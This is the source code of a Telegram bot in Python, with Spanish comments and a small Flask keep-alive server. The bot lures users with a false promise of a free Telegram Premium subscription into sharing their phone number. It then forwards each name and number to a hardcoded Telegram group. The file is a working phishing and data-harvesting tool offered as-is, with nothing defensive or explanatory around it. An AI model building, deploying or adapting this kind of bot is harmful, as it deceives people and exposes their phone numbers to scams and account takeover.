# --- Servidor web para que Render marque Live ---
from flask import Flask
import os, threading

app = Flask('')

@app.route('/')
def home():
    return "Bot online 💖"

def run():
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))

threading.Thread(target=run).start()
# --- Fin del servidor web ---

from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
import os

TOKEN = os.getenv("BOT_TOKEN")
GROUP_ID = -1002836094588  # con el -100 incluido

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    button = KeyboardButton("📱 Compartir mi número", request_contact=True)
    markup = ReplyKeyboardMarkup([[button]], resize_keyboard=True, one_time_keyboard=True)
    await update.message.reply_text(
        "Para reclamar 🥳 tu suscripción a Telegram Premium, toca el botón para compartir tu número:",
        reply_markup=markup
    )

async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if contact:
        # Log en consola para verificar
        print(f"Contacto recibido: {contact.first_name} {contact.last_name or ''} - {contact.phone_number}")
        
        # Enviar al grupo
        await context.bot.send_message(
            chat_id=GROUP_ID,
            text=f"📞 Nuevo número recibido:\n👤 Nombre: {contact.first_name} {contact.last_name or ''}\n📱 {contact.phone_number}",
            parse_mode="Markdown"
        )

def main():
    print("🦁 Bot online... esperando contactos...")
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, contact))
    app.run_polling()

if __name__ == "__main__":
    main()



